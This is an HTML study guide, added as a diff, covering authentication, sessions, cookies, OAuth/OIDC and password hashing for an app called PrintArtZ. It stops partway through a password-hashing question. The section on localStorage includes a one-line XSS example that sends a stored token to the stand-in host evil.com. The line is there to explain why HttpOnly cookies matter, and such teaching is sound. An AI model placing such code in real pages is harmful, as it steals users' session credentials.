@@ -1,0 +1,448 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Auth &amp; OAuth — PrintArtZ Study Guide</title>
+    <link rel="stylesheet" href="../style.css" />
+  </head>
+  <body>
+    <div class="wrap">
+      <div class="crumbs"><a href="../index.html">← Training guide</a> / Auth &amp; OAuth</div>
+      <h1><span class="g">Auth &amp; OAuth</span> — interview study guide</h1>
+      <p class="lead">
+        Authentication and authorization are the backbone of any app that has users — PrintArtZ signs people in
+        with Auth.js (NextAuth) using Google OAuth and keeps them logged in with database-backed sessions via a
+        Prisma adapter. This guide goes from absolute basics to advanced, in interview Q&amp;A form with real
+        snippets and the kind of full, spoken-aloud answer an interviewer expects. Click any question to expand.
+      </p>
+      <div style="display:flex;gap:10px;margin:10px 0">
+        <button class="btn" data-expand-all>Expand all</button>
+        <button class="tab" data-collapse-all>Collapse all</button>
+      </div>
+
+      <div data-tabs>
+        <div class="tabs">
+          <button class="tab" data-tab="basics">Basics</button>
+          <button class="tab" data-tab="sessions">Sessions vs Tokens</button>
+          <button class="tab" data-tab="cookies">Cookies &amp; Storage</button>
+          <button class="tab" data-tab="oauth">OAuth &amp; OIDC</button>
+          <button class="tab" data-tab="security">Security</button>
+        </div>
+
+        <!-- ================= BASICS ================= -->
+        <section class="panel" data-panel="basics">
+          <div class="qa"><button><span><span class="lvl basic">Basic</span>What is the difference between authentication and authorization?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p><strong>Authentication (AuthN)</strong> answers <em>“who are you?”</em> — it verifies identity, for example by checking a password or confirming a Google login. <strong>Authorization (AuthZ)</strong> answers <em>“what are you allowed to do?”</em> — it decides whether that now-known identity may perform an action, like editing a design or accessing an admin page.</p>
+              <p>The order matters: you authenticate first, then authorize. A common way to remember it: authentication is showing your passport at the border; authorization is the visa that says which areas you can enter. They are often conflated because both are “auth,” but they answer different questions and are usually implemented in different layers — identity providers handle AuthN, while your own app logic (role checks, ownership checks) handles AuthZ.</p>
+              <p>In PrintArtZ, Auth.js + Google handles authentication (proving you are a specific Google account), while the app's own code handles authorization — e.g. checking that the logged-in user actually owns a design before letting them delete it, or that they still have print quota remaining.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl basic">Basic</span>What is a session, and why do we need one?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>HTTP is <strong>stateless</strong> — each request arrives with no memory of the ones before it. A <strong>session</strong> is the mechanism that lets the server recognize a series of requests as coming from the same logged-in user, so you don't have to re-enter your password on every click.</p>
+              <p>Conceptually, when you log in the server establishes a session (a record that “this identifier belongs to user Amit”) and hands the browser a token or id — almost always in a cookie. The browser then sends that identifier back on every subsequent request, and the server uses it to look up who you are. The session is the bridge that turns a stateless protocol into a continuous, personalized experience.</p>
+              <p>In PrintArtZ, after Google sign-in, Auth.js creates a session <strong>row in the database</strong> (through the Prisma adapter) and sets a session cookie in the browser. Every later request carries that cookie, and Auth.js resolves it back to the user record.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl basic">Basic</span>How does login persist across requests?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>Persistence comes down to the browser automatically resending a credential on every request. After a successful login the server responds with a <code>Set-Cookie</code> header; the browser stores that cookie and, per the same-origin cookie rules, attaches it to all future requests to that site. The server reads it and re-establishes “who you are” each time.</p>
+              <pre><code>HTTP/1.1 200 OK
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
+
+// every later request the browser sends:
+Cookie: session=abc123</code></pre>
+              <p>The value in the cookie is either an opaque <strong>session id</strong> that the server looks up in a store (stateful), or a self-contained signed <strong>token</strong> like a JWT the server can verify without a lookup (stateless). PrintArtZ uses the first model: the cookie holds a session token that maps to a row in the database.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl basic">Basic</span>What are the common ways to authenticate a user?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>The main families are: <strong>something you know</strong> (a password or PIN), <strong>something you have</strong> (a phone receiving an OTP, a hardware key, an authenticator app), and <strong>something you are</strong> (biometrics like a fingerprint or face). Combining two of these is <strong>multi-factor authentication (MFA)</strong>, which dramatically reduces account takeover because stealing a password alone is no longer enough.</p>
+              <p>At the application level these show up as: local username/password, <strong>federated / social login</strong> (“Sign in with Google/GitHub” via OAuth/OIDC), <strong>magic links</strong> (a one-time login URL emailed to you), and increasingly <strong>passkeys</strong> (WebAuthn public-key credentials that replace passwords entirely). PrintArtZ uses federated login with Google, which offloads password handling and MFA to Google.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>What does Auth.js / NextAuth actually do for you?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>Auth.js (the framework-agnostic evolution of NextAuth) is an authentication library that handles the tedious, security-sensitive plumbing so you don't hand-roll it. It provides ready-made <strong>providers</strong> (Google, GitHub, email, credentials), runs the OAuth flow, manages the session (cookie creation, CSRF protection, sign-in/sign-out endpoints), and integrates with a database through an <strong>adapter</strong>.</p>
+              <p>Concretely it mounts a set of routes under <code>/api/auth/*</code> — for example <code>/api/auth/signin</code>, <code>/api/auth/callback/google</code>, <code>/api/auth/session</code>, and <code>/api/auth/signout</code>. You configure which providers to use and how sessions are stored, and it does the redirects, token exchange, and cookie management.</p>
+              <p>In PrintArtZ it's wired with the Google provider and the <strong>Prisma adapter</strong>, so signing in creates/looks up <code>User</code>, <code>Account</code>, and <code>Session</code> rows automatically. The choice of the Prisma adapter is what makes PrintArtZ use <em>database sessions</em> rather than JWT sessions.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>What is the difference between identity, authentication, and identity federation?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>An <strong>identity</strong> is the set of attributes that describe a user (an id, email, name). <strong>Authentication</strong> is the act of proving a request belongs to a given identity. <strong>Identity federation</strong> is delegating that proof to a trusted third party — an <strong>Identity Provider (IdP)</strong> like Google — so your app (the “relying party”) never handles the credential itself.</p>
+              <p>Federation is why “Sign in with Google” exists: the user proves themselves to Google, Google vouches for them to PrintArtZ, and PrintArtZ trusts that assertion. The benefits are large — no password storage, Google's MFA and anomaly detection come for free, and users skip yet another account. The trade-off is a dependency on the provider and the need to trust and correctly verify its assertions (the ID token).</p>
+            </div>
+          </div>
+        </section>
+
+        <!-- ================= SESSIONS VS TOKENS ================= -->
+        <section class="panel" data-panel="sessions">
+          <div class="qa"><button><span><span class="lvl basic">Basic</span>What is a server-side (database) session?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>A server-side session is <strong>stateful</strong>: the actual session data lives on the server (in a database, Redis, or memory), and the browser only holds an opaque <strong>session id</strong> in a cookie. On each request the server takes that id, looks up the corresponding record, and learns who the user is and what's in their session.</p>
+              <pre><code>Cookie:  session=9f2c1a...    // meaningless on its own
+DB row:  { id: "9f2c1a...", userId: 42, expires: 2026-10-01 }</code></pre>
+              <p>The key property is that the cookie contains <strong>no user information</strong> — it's just a pointer. The server is the source of truth, which means you can revoke a session instantly by deleting its row, and you can store as much as you like server-side without bloating the cookie.</p>
+              <p>PrintArtZ uses exactly this model: the Prisma adapter writes a <code>Session</code> row keyed by the session token in the cookie, and Auth.js reads that row to resolve the current user on each request.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl basic">Basic</span>What is a JWT and how is it structured?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>A <strong>JWT (JSON Web Token)</strong> is a self-contained, signed token that carries the user's data inside it. It's <strong>stateless</strong>: the server can verify and trust it using a secret/key without any database lookup, because the signature guarantees the contents weren't tampered with.</p>
+              <p>It has three Base64URL-encoded parts joined by dots — <code>header.payload.signature</code>:</p>
+              <pre><code>// header  — algorithm &amp; type
+{ "alg": "HS256", "typ": "JWT" }
+// payload — the "claims" (data)
+{ "sub": "42", "name": "Amit", "role": "user", "exp": 1735689600 }
+// signature — HMAC/RSA over header+payload using a secret
+
+eyJhbGci...  .  eyJzdWIiOiI0Mi...  .  SflKxwRJSMeKKF2QT4f...</code></pre>
+              <p>Crucially, the payload is <strong>encoded, not encrypted</strong> — anyone can decode and read it, so never put secrets in a JWT. The signature only proves integrity and authenticity (it wasn't altered and it came from someone with the key), not confidentiality.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>Stateful sessions vs stateless JWTs — what are the real trade-offs?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <div class="vs">
+                <div><h4>Server-side sessions</h4><p class="muted">Cookie holds an opaque id; data lives on the server. <strong>Instantly revocable</strong>, easy to change permissions on the fly, tiny cookie. Costs a lookup per request and a shared store across servers.</p></div>
+                <div><h4>JWTs</h4><p class="muted">Token carries the data and is verified by signature — <strong>no lookup, scales horizontally</strong> with no shared store. But hard to revoke before expiry, and stale until the token is reissued.</p></div>
+              </div>
+              <p>The honest one-line summary interviewers want: <strong>sessions trade a lookup for easy revocation and control; JWTs trade revocation for statelessness and scale.</strong> JWTs shine for short-lived access tokens between services or APIs. For a normal web app where you want to be able to log someone out immediately and change their access, database sessions are often the safer default — which is why PrintArtZ uses them.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>Where is each type stored, on the client and the server?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>For <strong>server-side sessions</strong>: the client stores only the opaque session id, ideally in an <code>HttpOnly</code> cookie; the server stores the full session record in its store (DB/Redis). Two places, but the sensitive data never leaves the server.</p>
+              <p>For <strong>JWT sessions</strong>: the server stores <em>nothing</em> (it just holds the signing key); the entire session lives on the client. That client-side token should still be kept in an <code>HttpOnly</code> cookie rather than <code>localStorage</code> to keep it away from JavaScript and XSS.</p>
+              <p>A useful nuance: Auth.js supports both strategies. With no database adapter it defaults to an <strong>encrypted JWT in a cookie</strong>; with the Prisma adapter (PrintArtZ's setup) it switches to <strong>database sessions</strong> where the cookie is just a token pointing at a <code>Session</code> row.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>How do you invalidate or log out with each approach?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>With <strong>server-side sessions</strong> logout is clean and immediate: delete (or mark expired) the session row and clear the cookie. Because the server checks the store on every request, the next request from that browser instantly fails — you can even remotely kill sessions on other devices.</p>
+              <p>With <strong>stateless JWTs</strong> there's a fundamental problem: a signed token is valid until it <em>expires</em>, and the server isn't consulting a store, so you can't simply “delete” it. Real logout requires extra machinery — keep access tokens short-lived (minutes) and use refresh tokens, and/or maintain a server-side <strong>denylist/blocklist</strong> of revoked token ids, which ironically reintroduces the state JWTs were meant to avoid.</p>
+              <p>This revocation gap is a top reason PrintArtZ uses database sessions: clicking sign-out deletes the <code>Session</code> row and the user is truly logged out that instant.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl adv">Advanced</span>What are access tokens and refresh tokens, and why have both?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>An <strong>access token</strong> is a short-lived credential (often a JWT, valid for minutes) that a client presents to access protected resources/APIs. A <strong>refresh token</strong> is a long-lived credential used <em>only</em> to obtain new access tokens when the old one expires — it's never sent to resource APIs.</p>
+              <p>The split exists to balance security and usability. Because access tokens can't be easily revoked, you make them expire quickly to limit the damage window if one leaks. But forcing the user to log in every few minutes is terrible UX — so the refresh token silently mints fresh access tokens in the background. The refresh token is higher value, so it's stored more carefully (HttpOnly cookie), can be revoked server-side, and is often <strong>rotated</strong> (a new one issued on each use, with reuse detection to catch theft).</p>
+              <pre><code>POST /oauth/token
+grant_type=refresh_token&amp;refresh_token=rt_9f...
+-&gt; { access_token: "eyJ...", expires_in: 900, refresh_token: "rt_ab..." }</code></pre>
+              <p>In an OAuth setup, the provider (Google) issues these; Auth.js can persist the refresh token in the <code>Account</code> row so PrintArtZ could call Google APIs on the user's behalf later without re-prompting.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl adv">Advanced</span>How would you scale sessions across multiple servers?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>The problem with naive in-memory sessions is that they live on one server — if a load balancer routes the user's next request to a different instance, that server has no idea who they are. There are three standard fixes.</p>
+              <ul>
+                <li><strong>Shared session store:</strong> put sessions in a central store (Redis, or a database like PrintArtZ's) that every instance can read. Simple and revocable; adds a network hop per request.</li>
+                <li><strong>Sticky sessions:</strong> configure the load balancer to always send a user to the same instance. Easy, but breaks on deploys/scaling and unbalances load.</li>
+                <li><strong>Stateless JWTs:</strong> no shared store needed — any instance verifies the token by signature. Scales beautifully but loses easy revocation.</li>
+              </ul>
+              <p>PrintArtZ takes the shared-store route implicitly: sessions are database rows, so any serverless function or instance handling a request resolves the same session from the same database.</p>
+            </div>
+          </div>
+        </section>
+
+        <!-- ================= COOKIES & STORAGE ================= -->
+        <section class="panel" data-panel="cookies">
+          <div class="qa"><button><span><span class="lvl basic">Basic</span>What is a cookie and how does the browser handle it?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>A cookie is a small piece of data the server sends via a <code>Set-Cookie</code> response header; the browser stores it and <strong>automatically</strong> attaches it to every subsequent request to the matching domain/path in a <code>Cookie</code> header. That automatic resend is precisely what makes cookies the natural home for a session identifier.</p>
+              <pre><code>Set-Cookie: session=abc123; Domain=printartz.app; Path=/;
+            Max-Age=2592000; HttpOnly; Secure; SameSite=Lax</code></pre>
+              <p>Key attributes control scope and lifetime: <code>Domain</code>/<code>Path</code> decide where it's sent, <code>Expires</code>/<code>Max-Age</code> decide how long it lives (a cookie with neither is a “session cookie” that dies when the browser closes), and the security flags below control who can read it and when it's sent.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl basic">Basic</span>What do the HttpOnly, Secure, and SameSite flags do?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>These three flags are the core defenses for a session cookie, and interviewers love to hear all three explained precisely:</p>
+              <ul>
+                <li><strong>HttpOnly:</strong> the cookie is invisible to JavaScript (<code>document.cookie</code> can't read it). This is the primary defense that stops an <strong>XSS</strong> attack from stealing the session token.</li>
+                <li><strong>Secure:</strong> the cookie is only sent over HTTPS, so it can't be sniffed over plaintext HTTP on a hostile network.</li>
+                <li><strong>SameSite:</strong> controls whether the cookie is sent on cross-site requests. <code>Strict</code> never sends it cross-site, <code>Lax</code> (a sensible default) sends it on top-level navigations but not on embedded/background cross-site requests, and <code>None</code> always sends it but then requires <code>Secure</code>. This is a key <strong>CSRF</strong> mitigation.</li>
+              </ul>
+              <p>Auth.js sets its session cookie <code>HttpOnly</code>, <code>Secure</code> (in production), and <code>SameSite=Lax</code> by default — exactly the recommended combination for PrintArtZ.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>Cookies vs localStorage vs sessionStorage — how do they differ?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <div class="vs">
+                <div><h4>Cookies</h4><p class="muted">Sent automatically to the server on every request; can be <code>HttpOnly</code> (hidden from JS); ~4KB; support expiry and the security flags. Ideal for auth tokens.</p></div>
+                <div><h4>localStorage / sessionStorage</h4><p class="muted">Client-only, never auto-sent to the server; always readable by JavaScript; ~5MB. <code>sessionStorage</code> clears on tab close, <code>localStorage</code> persists. Good for non-sensitive UI state.</p></div>
+              </div>
+              <p>The decisive difference for auth is <strong>who can read it</strong> and <strong>whether it's sent automatically</strong>. Because Web Storage is always JavaScript-accessible, it can never be protected from XSS the way an <code>HttpOnly</code> cookie can. Use cookies for the session credential; reserve <code>localStorage</code> for things like theme or draft form state.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>Why is storing tokens in localStorage risky?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>Because <code>localStorage</code> is fully readable by any JavaScript running on the page, a single <strong>XSS</strong> vulnerability — a malicious script injected via a comment, a compromised third-party dependency, an ad — can execute <code>localStorage.getItem('token')</code> and exfiltrate the token to an attacker's server. The attacker then has a valid credential and can impersonate the user from anywhere.</p>
+              <pre><code>// what an injected script can trivially do:
+fetch("https://evil.com/steal?t=" + localStorage.getItem("token"));</code></pre>
+              <p>An <code>HttpOnly</code> cookie is immune to this specific theft because JavaScript literally cannot read it. The common counter-argument is “but cookies are vulnerable to CSRF” — true, yet CSRF has robust, well-understood defenses (<code>SameSite</code>, CSRF tokens), whereas there is no comparable in-page defense once XSS can read your storage. The consensus best practice, and PrintArtZ's approach, is the <code>HttpOnly</code> cookie.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>What is the __Host- / __Secure- cookie prefix and why use it?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>These are special name prefixes browsers enforce to harden cookies against tampering by weaker sibling contexts. A cookie named with <code>__Secure-</code> must be set with the <code>Secure</code> flag over HTTPS. A cookie named with <code>__Host-</code> must additionally have no <code>Domain</code> attribute and a <code>Path=/</code>, which locks it to the exact host and prevents a subdomain from overwriting it.</p>
+              <pre><code>Set-Cookie: __Host-session=abc123; Secure; Path=/; HttpOnly; SameSite=Lax</code></pre>
+              <p>The benefit is defense against <strong>cookie fixation/injection</strong> from a compromised or malicious subdomain. Auth.js automatically uses these prefixes for its cookies in production (e.g. <code>__Secure-next-auth.session-token</code>), so PrintArtZ gets this hardening for free.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl adv">Advanced</span>Walk through exactly what happens to the cookie during a PrintArtZ login.</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>Tracing the cookie lifecycle end-to-end is a great way to show you understand the whole picture:</p>
+              <ol>
+                <li>User clicks “Sign in with Google.” Auth.js first sets a short-lived <strong>CSRF token</strong> and a <strong>state</strong> cookie, then redirects to Google.</li>
+                <li>Google authenticates the user and redirects back to <code>/api/auth/callback/google</code> with an authorization code.</li>
+                <li>Auth.js verifies the returned <code>state</code> against the cookie (CSRF protection), exchanges the code for tokens server-side, and reads the user's profile from the ID token.</li>
+                <li>The Prisma adapter upserts the <code>User</code>/<code>Account</code> and creates a <code>Session</code> row, then Auth.js sends <code>Set-Cookie</code> with the session token (<code>HttpOnly; Secure; SameSite=Lax</code>).</li>
+                <li>On every later request the browser auto-sends that cookie; Auth.js looks up the <code>Session</code> row to identify the user. On sign-out it deletes the row and clears the cookie.</li>
+              </ol>
+              <p>Notice the browser stores only the opaque token — all the sensitive identity data stays in PrintArtZ's database.</p>
+            </div>
+          </div>
+        </section>
+
+        <!-- ================= OAUTH & OIDC ================= -->
+        <section class="panel" data-panel="oauth">
+          <div class="qa"><button><span><span class="lvl basic">Basic</span>What is OAuth 2.0, in one clear sentence?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>OAuth 2.0 is an <strong>authorization</strong> framework that lets a user grant one application limited access to their data on another service <em>without sharing their password</em>. The classic example is letting a photo-printing app read your Google Photos: you approve it, and the app gets a scoped access token — never your Google credentials.</p>
+              <p>The most important interview nuance: OAuth is about <strong>authorization (delegated access)</strong>, not authentication. It was designed to answer “can this app access that resource on my behalf?” People bolted login onto it — which is exactly why <strong>OpenID Connect</strong> was later added on top to do authentication properly. Confusing the two is one of the most common mistakes candidates make.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl basic">Basic</span>Who are the four roles in an OAuth flow?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>OAuth defines four parties, and naming them cleanly makes the whole flow click:</p>
+              <ul>
+                <li><strong>Resource Owner:</strong> the user who owns the data and grants access (you).</li>
+                <li><strong>Client:</strong> the application requesting access (PrintArtZ).</li>
+                <li><strong>Authorization Server:</strong> the service that authenticates the user and issues tokens (Google's OAuth server).</li>
+                <li><strong>Resource Server:</strong> the API holding the protected data that accepts the access token (a Google API).</li>
+              </ul>
+              <p>In PrintArtZ, <em>you</em> are the resource owner, <em>PrintArtZ</em> is the client, and <em>Google</em> plays both the authorization server (during sign-in) and, if PrintArtZ ever calls Google APIs, the resource server.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>Explain the Authorization Code flow step by step.</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>The Authorization Code flow is the standard, most secure flow for web apps, and PrintArtZ uses it via Auth.js. The core idea is a two-step handoff: the browser only ever carries a temporary <strong>code</strong>, and the actual token exchange happens server-to-server.</p>
+              <ol>
+                <li><strong>Redirect to authorize:</strong> PrintArtZ redirects the browser to Google's authorize endpoint with its <code>client_id</code>, <code>redirect_uri</code>, requested <code>scope</code>, and a random <code>state</code> value.</li>
+                <li><strong>User consents:</strong> Google authenticates the user (and shows the consent screen if needed).</li>
+                <li><strong>Code returned:</strong> Google redirects back to <code>/api/auth/callback/google?code=...&amp;state=...</code>. The code is short-lived and single-use.</li>
+                <li><strong>Token exchange (back channel):</strong> PrintArtZ's server POSTs the code plus its <strong>client secret</strong> directly to Google's token endpoint and receives an ID token and access token — this never touches the browser.</li>
+                <li><strong>Session created:</strong> PrintArtZ verifies the tokens, creates the session, and sets the cookie.</li>
+              </ol>
+              <pre><code>// 1) browser -&gt; Google
+GET https://accounts.google.com/o/oauth2/v2/auth
+  ?client_id=...&amp;redirect_uri=.../api/auth/callback/google
+  &amp;response_type=code&amp;scope=openid%20email%20profile&amp;state=xyz
+
+// 4) server -&gt; Google (back channel, includes client_secret)
+POST https://oauth2.googleapis.com/token
+  code=...&amp;client_id=...&amp;client_secret=...&amp;grant_type=authorization_code</code></pre>
+              <p>Why not just return the token to the browser directly? Because the browser/redirect URL is exposed (history, logs, referrer); shipping only a one-time code and doing the secret-bearing exchange server-side keeps the actual token out of that exposed channel.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>What is the state parameter for?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>The <code>state</code> parameter is a random, unguessable value the client generates before redirecting to the authorization server, stashes (in a cookie or session), and then checks matches when the callback returns. Its job is <strong>CSRF protection for the OAuth flow</strong> — it ensures the callback that arrives is the response to a request <em>this</em> user actually initiated, not one an attacker stitched together.</p>
+              <p>Without <code>state</code>, an attacker could trick a victim into completing a login that links the victim's session to the attacker's account (a “login CSRF” / authorization-code-injection attack). Auth.js generates and verifies <code>state</code> automatically, so PrintArtZ is protected without extra work.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>What are scopes, and how do they relate to consent?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p><strong>Scopes</strong> are strings that declare exactly what access the client is asking for — e.g. <code>openid</code>, <code>email</code>, <code>profile</code>, or something granular like <code>https://www.googleapis.com/auth/drive.readonly</code>. They implement the <strong>principle of least privilege</strong>: the app requests only what it needs, and the user sees those specific permissions on the consent screen before approving.</p>
+              <p>The access token that comes back is limited to the granted scopes, so even if it leaks, the blast radius is bounded to what was consented. For login, PrintArtZ only needs <code>openid email profile</code> — enough to identify the user and populate their name/email — and nothing more invasive, which keeps the consent screen minimal and trustworthy.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>What is OpenID Connect (OIDC) and how does it differ from OAuth?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p><strong>OpenID Connect</strong> is a thin <strong>authentication</strong> layer built on top of OAuth 2.0. OAuth alone gives you an access token to reach APIs but says nothing standard about <em>who the user is</em>; OIDC fixes that by adding an <strong>ID token</strong> — a JWT with verified identity claims — plus a standardized <code>/userinfo</code> endpoint and the special <code>openid</code> scope.</p>
+              <p>The mental model: <em>OAuth = authorization (access to resources); OIDC = authentication (proof of identity) done the right way on the same rails.</em> Because “Sign in with Google” is really a login, it uses OIDC — the presence of the <code>openid</code> scope and the ID token is what turns an OAuth flow into a proper authentication flow.</p>
+              <pre><code>// ID token payload (identity claims) returned by OIDC
+{ "iss": "https://accounts.google.com", "aud": "&lt;client_id&gt;",
+  "sub": "10769150350006150...", "email": "amit@example.com",
+  "email_verified": true, "name": "Amit", "exp": 1735689600 }</code></pre>
+              <p>Auth.js reads and verifies this ID token during the Google callback and uses its claims to create the PrintArtZ user record.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Compare</span>ID token vs access token — what's the difference?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <div class="vs">
+                <div><h4>ID token (OIDC)</h4><p class="muted">Proves <em>who the user is</em>. A JWT for the <strong>client</strong> to read; contains identity claims (<code>sub</code>, <code>email</code>, <code>name</code>). You verify it (issuer, audience, signature, expiry) but never send it to an API.</p></div>
+                <div><h4>Access token (OAuth)</h4><p class="muted">Grants <em>access to resources</em>. Meant for the <strong>resource server / API</strong>, not for the client to inspect; often opaque. You attach it to API calls as <code>Authorization: Bearer ...</code>.</p></div>
+              </div>
+              <p>Rule of thumb: the ID token is <em>about the user, for you</em>; the access token is <em>for the API, use it don't read it</em>. A classic bug is treating an access token as proof of identity, or sending an ID token to an API — mixing up their audiences.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl adv">Advanced</span>What is PKCE and why does it matter?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p><strong>PKCE (Proof Key for Code Exchange</strong>, pronounced “pixy”) hardens the authorization code flow against <strong>code interception</strong>. The client generates a random secret called the <code>code_verifier</code>, sends its hash (<code>code_challenge</code>) on the initial authorize request, and then must present the original <code>code_verifier</code> when exchanging the code for tokens. The authorization server checks the verifier hashes to the challenge it saw.</p>
+              <pre><code>// 1) authorize request carries the hashed challenge
+code_challenge=BASE64URL(SHA256(verifier))&amp;code_challenge_method=S256
+// 2) token exchange must prove knowledge of the original
+POST /token  code=...&amp;code_verifier=&lt;original random string&gt;</code></pre>
+              <p>The payoff: even if an attacker steals the authorization code (say from a redirect on a mobile device or a shared machine), they can't redeem it without the verifier, which never left the legitimate client. PKCE originated to protect public clients (mobile/SPA that can't hold a secret) but is now <strong>recommended for all clients</strong>, and Auth.js applies it to PrintArtZ's Google flow by default.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl adv">Advanced</span>Why use “Sign in with Google” instead of building your own login?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>Delegating authentication to Google removes an entire category of risk and work. You <strong>never store passwords</strong>, so there's no password database to breach, no hashing/reset/lockout logic to get right, and no liability for credential leaks. You inherit Google's <strong>MFA, bot defenses, and anomaly detection</strong> for free, and Google gives you a pre-verified email, which sidesteps your own email-verification flow.</p>
+              <p>The UX win is real too: users skip creating yet another account and password, which improves conversion. The trade-offs to acknowledge in an interview are the dependency on Google (availability, account lock-outs), tying users to that provider unless you also offer alternatives, and privacy considerations around the third party. For a project like PrintArtZ, offloading auth to Google is a pragmatic, secure default.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl adv">Advanced</span>Why is the Implicit flow discouraged now?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>The <strong>Implicit flow</strong> was an older OAuth variant where the authorization server returned the access token <em>directly in the browser redirect</em> (in the URL fragment), skipping the code-exchange step. It existed because early SPAs couldn't do a back-channel exchange and couldn't keep a client secret.</p>
+              <p>It's now discouraged (the OAuth 2.1 direction drops it) because putting the token in the URL exposes it to browser history, referrer headers, and any script on the page, and it can't use a client secret or reliable rotation. The modern recommendation is the <strong>Authorization Code flow with PKCE</strong> for everyone, including SPAs — you get the security of the code exchange without needing a stored secret. PrintArtZ, being a server-rendered Next.js app, uses the code flow with a real client secret plus PKCE.</p>
+            </div>
+          </div>
+        </section>
+
+        <!-- ================= SECURITY ================= -->
+        <section class="panel" data-panel="security">
+          <div class="qa"><button><span><span class="lvl basic">Basic</span>Why must passwords be hashed, and never encrypted or stored plainly?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>Storing passwords in plaintext means a single database breach hands the attacker every user's actual password — which they'll reuse on the victims' other accounts. Even <strong>encryption</strong> is wrong for passwords because it's reversible: whoever holds the key (and an attacker who breaches your server often does) can decrypt them all.</p>
+              <p><strong>Hashing</strong> is the right tool because it's a one-way function — you store <code>hash(password)</code>, and at login you hash the submitted password and compare. You never need to recover the original, so there's nothing reversible to steal. Critically, you must use a <strong>slow, password-specific hash</strong> (bcrypt, scrypt, Argon2), not a fast general hash like SHA-256, which attackers can brute-force billions of times per second.</p>
+              <p>PrintArtZ sidesteps this entirely by using Google OAuth — it stores no passwords at all, which is the most secure password strategy of all: don't have any.</p>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl basic">Basic</span>What is a salt, and what problem does it solve?</span><span class="chev">▶</span></button>
+            <div class="body">
+              <p>A <strong>salt</strong> is a unique random value generated per password and stored alongside the hash; it's mixed into the input before hashing. Its job is to defeat <strong>precomputation attacks</strong> — specifically <strong>rainbow tables</strong>, which are giant lookup tables mapping common passwords to their hashes.</p>
+              <p>Because every user gets a different salt, two people with the same password get completely different hashes, so an attacker can't reuse one cracked result or a prebuilt table — they'd have to brute-force each account separately. Salts don't need to be secret, just unique. Modern password hashes like bcrypt and Argon2 <strong>generate and embed the salt automatically</strong> inside the output string, so you store one value and get salting for free.</p>
+              <pre><code>// bcrypt output embeds algorithm, cost, salt, and hash:
+$2b$12$eImiTXuWVxfM37uY4JANjQ.  someHashBytesHere...
+//  |   |   \___ 22-char salt _/ \____ hash ____/
+// alg cost</code></pre>
+            </div>
+          </div>
+
+          <div class="qa"><button><span><span class="lvl mid">Intermediate</span>bcrypt vs Argon2 — how do you choose, and what is a "work factor"?</span><span class="chev">▶</span></button>
+            <div class="body">
